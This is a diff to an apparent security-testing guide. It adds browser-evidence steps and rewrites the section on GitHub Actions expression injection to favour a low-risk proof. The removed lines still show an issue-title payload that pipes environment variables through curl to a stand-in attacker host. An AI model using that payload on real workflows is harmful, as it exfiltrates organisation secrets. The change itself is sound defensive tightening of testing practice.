@@ -60,6 +60,17 @@ Core discipline:
   evidence, replay notes, coverage state, target memory, or Evidence Ledger
   entries.
 
+Browser-state work:
+
+1. Prefer chrome-devtools MCP for live browser/network evidence.
+2. Prefer playwright MCP for automated interaction and snapshots.
+3. Use `tools/browser_evidence.py` / `playwright-cli` only when MCP is
+   unavailable or a scriptable fallback is needed.
+4. Import MCP artifacts with
+   `python3 tools/browser_mcp_import.py --target <target> --network-json <file> --url <page-url>`
+   so `recon/<target>/browser/`, `/surface`, `/checkpoint`, and `/autopilot`
+   can continue using the same browser-observed API surface.
+
 Value-first coverage model:
 
 - High-value vulnerability classes are prioritized by practical impact,
@@ -369,11 +380,17 @@ find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request
 # 4. self-hosted runners = escape to org infrastructure
 ```
 
-**Expression injection PoC (create an issue with this title):**
-```
-test"; curl https://ATTACKER.com/$(env | base64 -w0) #
-```
-If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).
+**Expression injection validation posture:**
+
+Do not default to secret exfiltration. First prove the workflow command-injection
+or expression-injection boundary with non-sensitive output, a controlled marker,
+or a dry-run/test repository when available. Escalate to secret or privileged
+workflow proof only when lower-risk evidence cannot establish impact, the current
+target context allows it, and `rules/red-lines.md` passes.
+
+If workflow command execution with access to org secrets is proven → likely
+Critical impact. Keep the PoC minimal, preserve logs, and avoid leaking real
+secret values unless that is the only necessary proof path.
 
 ## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY
 
